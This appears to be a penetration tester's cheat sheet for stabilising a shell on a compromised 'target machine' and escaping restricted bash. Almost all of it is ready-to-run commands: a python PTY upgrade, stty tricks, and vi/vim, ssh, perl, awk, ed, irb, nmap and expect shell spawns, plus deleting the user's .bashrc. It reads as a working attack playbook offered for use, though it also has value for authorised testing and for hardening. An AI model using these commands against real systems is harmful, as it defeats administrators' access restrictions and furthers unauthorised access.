Out of the gate.

python -c 'import pty; pty.spawn("/bin/bash")'
OR
python3 -c 'import pty; pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp:/snap/bin
export TERM=xterm-256color
alias ll='ls -lsaht --color=auto'
Keyboard Shortcut: Ctrl + Z (Background Process.)
stty raw -echo ; fg ; reset
stty columns 150 rows 150
(stty size)
 
* Don't forget that you can always set the terminal history to be infinite, and the keystroke scroll back. 

* Grab a valid tty.
* What OS are you on? Grab access to those binaries fast by exporting each environment variable. Debian/CentOS/FreeBSD
* Want a color terminal to easily tell apart file permissions? Directories? Files?
* Fastest way to list out the files in a directory, show size, show permissions, human readable.
* Make this shell stable.



Is this rbash (Restricted Bash)? PT1
$ vi
:set shell=/bin/sh
:shell

$ vim
:set shell=/bin/sh
:shell

Is this rbash (Restricted Bash)? PT2
(This requires ssh user-level access)
ssh user@127.0.0.1 "/bin/sh"
rm $HOME/.bashrc
exit
ssh user@127.0.0.1
(Bash Shell)

Is python present on the target machine?
python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/sh")'

Is perl present on the target machine?
perl -e 'exec "/bin/bash";'
perl -e 'exec "/bin/sh";'

Is AWK present on the target machine?
awk 'BEGIN {system("/bin/bash -i")}'
awk 'BEGIN {system("/bin/sh -i")}'

Is ed present on the target machines?
ed
!sh

IRB Present on the target machine?
exec "/bin/sh"

Is Nmap present on the target machine?
nmap --interactive
nmap> !sh

Expect:

expect -v
  expect version 5.45.4
  
$ cat > /tmp/shell.sh <<EOF
#!/usr/bin/expect
spawn bash
interact
EOF

$ chmod u+x /tmp/shell.sh
$ /tmp/shell.sh